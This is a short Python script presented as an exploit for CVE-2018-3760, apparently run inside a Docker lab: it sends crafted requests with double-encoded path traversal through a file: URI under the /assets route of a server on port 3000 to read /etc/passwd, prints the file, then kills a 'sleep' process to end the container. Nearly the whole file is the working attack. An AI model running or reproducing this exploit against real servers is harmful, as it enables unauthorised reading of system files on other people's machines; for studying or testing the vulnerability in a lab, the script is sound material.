import os

import requests
import argparse


def do_exploit(victim_ip):
    victim = 'http://' + victim_ip
    victim_port = ':3000'
    error_path = '/assets/file:%2f%2f/etc/passwd'
    passwd_path = '/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd'

    print("extracting legit paths")
    requests.get(victim + victim_port + error_path)

    print("extracting /etc/passwd from victim")
    exploit_request = requests.get(victim + victim_port + passwd_path)

    print('/etc/passwd:')
    return exploit_request.text


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='CVE-2018-3760 exploit')

    parser.add_argument('-ip', dest='server_ip', action='store', type=str, required=True,
                        help='The IP address of the target server')
    args = parser.parse_args()

    print(do_exploit(args.server_ip))

    # shutdown docker container by killing main process after exploit is finished
    print("exploit finished - shutting down")
    os.system("pkill -f sleep")
